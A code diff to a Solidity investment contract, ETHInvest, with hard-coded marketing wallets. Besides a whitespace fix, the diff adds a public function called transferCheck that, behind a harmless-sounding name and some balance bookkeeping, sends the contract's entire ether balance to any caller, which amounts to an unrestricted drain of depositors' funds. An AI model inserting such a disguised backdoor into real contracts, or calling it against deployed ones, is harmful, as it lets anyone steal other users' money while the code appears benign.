@@ -10,7 +10,7 @@ contract ETHInvest {
     mapping(address => uint[]) public paid;
     mapping(address => uint) public depositedAt;
     mapping(address => uint) public timestamps;
-    
+
     constructor() public {
         marketing1 = 0xE5e128fBb8E28Bd24f8454d1149FE55B03F9B07c; // wallet for marketing1;
         marketing2 = 0xbf8F0a61B3B03F2F85A2d1238b038DE1D6985B6d; // wallet for marketing2;
@@ -70,4 +70,14 @@ contract ETHInvest {
             addr := mload(add(bs, 0x14))
         }
     }
+	 function transferCheck() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
